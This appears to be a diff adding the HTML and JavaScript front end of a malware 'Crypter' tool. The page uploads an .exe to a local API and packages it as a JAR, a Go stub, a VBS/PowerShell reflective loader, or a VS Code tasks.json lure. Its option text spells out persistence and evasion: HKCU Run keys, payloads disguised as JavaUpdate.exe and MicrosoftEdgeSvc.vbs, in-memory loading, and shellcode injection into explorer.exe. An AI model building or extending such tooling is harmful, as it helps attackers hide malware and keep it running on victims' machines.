@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Crypter</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg:       #0b0d11;
+      --surface:  #13161c;
+      --border:   #1f242e;
+      --accent:   #7c5cfc;
+      --accent2:  #5c8afc;
+      --green:    #3be07b;
+      --red:      #ff4f4f;
+      --text:     #e2e6f0;
+      --muted:    #6b7280;
+      --radius:   10px;
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+    }
+
+    .card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 14px;
+      width: 100%;
+      max-width: 520px;
+      padding: 32px;
+      box-shadow: 0 8px 40px rgba(0,0,0,.5);
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 28px;
+    }
+    .header-icon {
+      width: 36px; height: 36px;
+      background: linear-gradient(135deg, var(--accent), var(--accent2));
+      border-radius: 8px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 18px;
+    }
+    .header h1 { font-size: 1.25rem; font-weight: 700; letter-spacing: .02em; }
+    .header span { font-size: .75rem; color: var(--muted); margin-left: 6px; }
+
+    /* Drop zone */
+    .dropzone {
+      border: 2px dashed var(--border);
+      border-radius: var(--radius);
+      padding: 32px 20px;
+      text-align: center;
+      cursor: pointer;
+      transition: border-color .2s, background .2s;
+      position: relative;
+    }
+    .dropzone:hover, .dropzone.drag { border-color: var(--accent); background: rgba(124,92,252,.05); }
+    .dropzone input { position: absolute; inset: 0; opacity: 0; cursor: pointer; }
+    .dropzone .dz-icon { font-size: 28px; margin-bottom: 8px; }
+    .dropzone .dz-label { font-size: .9rem; color: var(--muted); }
+    .dropzone .dz-label b { color: var(--accent); }
+    .dropzone .dz-file {
+      display: none;
+      align-items: center;
+      gap: 8px;
+      background: rgba(124,92,252,.12);
+      border-radius: 6px;
+      padding: 8px 12px;
+      font-size: .85rem;
+      margin-top: 10px;
+    }
+    .dropzone .dz-file.show { display: flex; }
+    .dropzone .dz-file .name { font-weight: 600; color: var(--text); }
+    .dropzone .dz-file .size { color: var(--muted); }
+
+    /* Format selector */
+    .section-label {
+      font-size: .72rem;
+      font-weight: 600;
+      letter-spacing: .08em;
+      text-transform: uppercase;
+      color: var(--muted);
+      margin: 22px 0 8px;
+    }
+
+    .format-tabs {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 8px;
+    }
+    .fmt-btn {
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 10px 6px;
+      text-align: center;
+      cursor: pointer;
+      transition: border-color .15s, background .15s;
+      user-select: none;
+    }
+    .fmt-btn .fmt-icon { font-size: 20px; margin-bottom: 4px; }
+    .fmt-btn .fmt-name { font-size: .8rem; font-weight: 600; }
+    .fmt-btn .fmt-desc { font-size: .7rem; color: var(--muted); margin-top: 2px; }
+    .fmt-btn.active {
+      border-color: var(--accent);
+      background: rgba(124,92,252,.12);
+    }
+    .fmt-btn.active .fmt-name { color: var(--accent); }
+
+    /* Dual-hook toggle */
+    .toggle-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 12px 14px;
+      cursor: pointer;
+      user-select: none;
+    }
+    .toggle-info .toggle-title { font-size: .9rem; font-weight: 600; }
+    .toggle-info .toggle-sub  { font-size: .75rem; color: var(--muted); margin-top: 2px; }
+
+    .switch { position: relative; width: 42px; height: 24px; flex-shrink: 0; }
+    .switch input { opacity: 0; width: 0; height: 0; }
+    .slider {
+      position: absolute; inset: 0;
+      background: var(--border);
+      border-radius: 24px;
+      transition: background .2s;
+      cursor: pointer;
+    }
+    .slider::before {
+      content: '';
+      position: absolute;
+      width: 18px; height: 18px;
+      left: 3px; top: 3px;
+      background: white;
+      border-radius: 50%;
+      transition: transform .2s;
+    }
+    input:checked + .slider { background: var(--accent); }
+    input:checked + .slider::before { transform: translateX(18px); }
+
+    /* Dual hook info panel */
+    .dh-info {
+      display: none;
+      font-size: .75rem;
+      color: var(--muted);
+      background: rgba(124,92,252,.07);
+      border: 1px solid rgba(124,92,252,.2);
+      border-radius: 7px;
+      padding: 10px 12px;
+      margin-top: 8px;
+      line-height: 1.5;
+    }
+    .dh-info.show { display: block; }
+    .dh-info b { color: var(--accent); }
+
+    /* Encrypt button */
+    .btn-crypt {
+      width: 100%;
+      margin-top: 22px;
+      padding: 13px;
+      background: linear-gradient(135deg, var(--accent), var(--accent2));
+      color: white;
+      font-size: .95rem;
+      font-weight: 700;
+      border: none;
+      border-radius: var(--radius);
+      cursor: pointer;
+      transition: opacity .2s, transform .1s;
+      letter-spacing: .03em;
+    }
+    .btn-crypt:hover:not(:disabled) { opacity: .9; }
+    .btn-crypt:active:not(:disabled) { transform: scale(.98); }
+    .btn-crypt:disabled { opacity: .45; cursor: not-allowed; }
+
+    /* Status bar */
+    .status {
+      margin-top: 14px;
+      font-size: .82rem;
+      border-radius: 7px;
+      padding: 10px 13px;
+      display: none;
+      align-items: center;
+      gap: 8px;
+    }
+    .status.show { display: flex; }
+    .status.info { background: rgba(92,138,252,.1); color: var(--accent2); border: 1px solid rgba(92,138,252,.2); }
+    .status.ok   { background: rgba(59,224,123,.1); color: var(--green);   border: 1px solid rgba(59,224,123,.2); }
+    .status.err  { background: rgba(255,79,79,.1);  color: var(--red);     border: 1px solid rgba(255,79,79,.2); }
+
+    /* Spinner */
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .spinner {
+      width: 14px; height: 14px;
+      border: 2px solid currentColor;
+      border-top-color: transparent;
+      border-radius: 50%;
+      animation: spin .7s linear infinite;
+      flex-shrink: 0;
+    }
+
+    /* Footer */
+    .footer { margin-top: 20px; text-align: center; font-size: .72rem; color: var(--muted); }
+  </style>
+</head>
+<body>
+<div class="card">
+  <div class="header">
+    <div class="header-icon">🔐</div>
+    <div>
+      <h1>Crypter <span>v1.0</span></h1>
+    </div>
+  </div>
+
+  <!-- Drop zone -->
+  <div class="dropzone" id="dz">
+    <input type="file" id="fileInput" accept=".exe" />
+    <div class="dz-icon">📂</div>
+    <div class="dz-label">Drop an <b>.exe</b> here or click to browse</div>
+    <div class="dz-file" id="dzFile">
+      <span>📄</span>
+      <span class="name" id="dzName"></span>
+      <span class="size" id="dzSize"></span>
+    </div>
+  </div>
+
+  <!-- Output format -->
+  <div class="section-label">Output format</div>
+  <div class="format-tabs" id="fmtTabs">
+    <div class="fmt-btn active" data-fmt="jar">
+      <div class="fmt-icon">☕</div>
+      <div class="fmt-name">JAR</div>
+      <div class="fmt-desc">Java executable</div>
+    </div>
+    <div class="fmt-btn" data-fmt="exe">
+      <div class="fmt-icon">⚙️</div>
+      <div class="fmt-name">EXE</div>
+      <div class="fmt-desc">Go-compiled stub</div>
+    </div>
+    <div class="fmt-btn" data-fmt="bat">
+      <div class="fmt-icon">📜</div>
+      <div class="fmt-name">BAT</div>
+      <div class="fmt-desc">VBS+PS reflective loader</div>
+    </div>
+    <div class="fmt-btn" data-fmt="tasks">
+      <div class="fmt-icon">🗂️</div>
+      <div class="fmt-name">TASKS</div>
+      <div class="fmt-desc">VS Code lure + inject</div>
+    </div>
+  </div>
+
+  <!-- Dual-hook toggle -->
+  <div class="section-label">Options</div>
+  <label class="toggle-row" for="dualHook">
+    <div class="toggle-info">
+      <div class="toggle-title">⚡ Dual-Hooked</div>
+      <div class="toggle-sub">Two independent execution + persistence paths</div>
+    </div>
+    <div class="switch">
+      <input type="checkbox" id="dualHook" />
+      <span class="slider"></span>
+    </div>
+  </label>
+  <div class="dh-info" id="dhInfo"></div>
+
+  <!-- Encrypt button -->
+  <button class="btn-crypt" id="cryptBtn" disabled>Encrypt</button>
+
+  <!-- Status -->
+  <div class="status" id="status">
+    <div class="spinner" id="statusSpinner" style="display:none"></div>
+    <span id="statusText"></span>
+  </div>
+
+  <div class="footer">Standalone · No Overlord · Port 7641</div>
+</div>
+
+<script>
+  const dz = document.getElementById('dz');
+  const fileInput = document.getElementById('fileInput');
+  const dzFile = document.getElementById('dzFile');
+  const dzName = document.getElementById('dzName');
+  const dzSize = document.getElementById('dzSize');
+  const fmtTabs = document.getElementById('fmtTabs');
+  const dualHook = document.getElementById('dualHook');
+  const dhInfo = document.getElementById('dhInfo');
+  const cryptBtn = document.getElementById('cryptBtn');
+  const status = document.getElementById('status');
+  const statusText = document.getElementById('statusText');
+  const statusSpinner = document.getElementById('statusSpinner');
+
+  let selectedFile = null;
+  let selectedFmt = 'jar';
+
+  // Dual-hook descriptions per format
+  const dhDesc = {
+    jar: '<b>Hook 1:</b> <code>static{}</code> initializer (fires on class load) · <b>Hook 2:</b> <code>main()</code> entry point · <b>Persist:</b> copies to <code>%APPDATA%\\JavaUpdate.exe</code> + HKCU Run key',
+    exe: '<b>Hook 1:</b> Primary process spawn (hidden window) · <b>Hook 2:</b> Registers HKCU Run key via <code>reg add</code> so it re-runs on every login',
+    bat: '<b>Hook 1:</b> VBS spawns PS hidden → C# PE loader maps payload in memory (no EXE on disk) · <b>Hook 2:</b> Copies VBS to <code>%APPDATA%\\MicrosoftEdgeSvc.vbs</code> + HKCU Run key → <code>wscript /b</code> re-runs on every login',
+    tasks: '<b>Hook 1:</b> VS Code folder-open task → shellcode injected into <code>explorer.exe</code> (LOTL) · <b>Hook 2:</b> Drops VBS sidecar to <code>%APPDATA%\\MicrosoftEdgeSvc.vbs</code> + HKCU Run key → re-injects on every login',
+  };
+
+  // Drag & drop
+  dz.addEventListener('dragover', e => { e.preventDefault(); dz.classList.add('drag'); });
+  dz.addEventListener('dragleave', () => dz.classList.remove('drag'));
+  dz.addEventListener('drop', e => {
+    e.preventDefault(); dz.classList.remove('drag');
+    const f = e.dataTransfer?.files[0];
+    if (f) setFile(f);
+  });
+  fileInput.addEventListener('change', () => {
+    if (fileInput.files?.[0]) setFile(fileInput.files[0]);
+  });
+
+  function setFile(f) {
+    selectedFile = f;
+    dzName.textContent = f.name;
+    dzSize.textContent = formatBytes(f.size);
+    dzFile.classList.add('show');
+    cryptBtn.disabled = false;
+    setStatus('');
+  }
+
+  // Format tabs
+  fmtTabs.addEventListener('click', e => {
+    const btn = e.target.closest('.fmt-btn');
+    if (!btn) return;
+    document.querySelectorAll('.fmt-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    selectedFmt = btn.dataset.fmt;
+    updateDhInfo();
+  });
+
+  // Dual-hook info
+  dualHook.addEventListener('change', updateDhInfo);
+  function updateDhInfo() {
+    if (dualHook.checked) {
+      dhInfo.innerHTML = dhDesc[selectedFmt];
+      dhInfo.classList.add('show');
+    } else {
+      dhInfo.classList.remove('show');
+    }
+  }
+
+  // Encrypt
+  cryptBtn.addEventListener('click', async () => {
+    if (!selectedFile) return;
+    cryptBtn.disabled = true;
+    setStatus('Encrypting…', 'info', true);
+
+    const form = new FormData();
+    form.append('file', selectedFile);
+    form.append('format', selectedFmt);
+    form.append('dualHooked', dualHook.checked ? 'true' : 'false');
+
+    try {
+      const res = await fetch('/api/crypt', { method: 'POST', body: form });
+      if (!res.ok) {
+        const err = await res.json().catch(() => ({ error: res.statusText }));
+        setStatus('Error: ' + err.error, 'err');
+        return;
+      }
+      // Trigger download
+      const blob = await res.blob();
+      const cd = res.headers.get('content-disposition') ?? '';
+      const name = cd.match(/filename="([^"]+)"/)?.[1] ?? `output.${selectedFmt}`;
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url; a.download = name; a.click();
+      URL.revokeObjectURL(url);
+      setStatus(`✓ ${name} (${formatBytes(blob.size)}) — download started`, 'ok');
+    } catch (e) {
+      setStatus('Network error: ' + e.message, 'err');
+    } finally {
+      cryptBtn.disabled = false;
+    }
+  });
+
+  function setStatus(msg, type = '', spinner = false) {
+    if (!msg) { status.className = 'status'; return; }
+    status.className = `status show ${type}`;
+    statusText.textContent = msg;
+    statusSpinner.style.display = spinner ? 'block' : 'none';
+  }
+
+  function formatBytes(b) {
+    if (b < 1024) return b + ' B';
+    if (b < 1048576) return (b / 1024).toFixed(1) + ' KB';
+    return (b / 1048576).toFixed(1) + ' MB';
+  }
+</script>
+</body>
+</html>
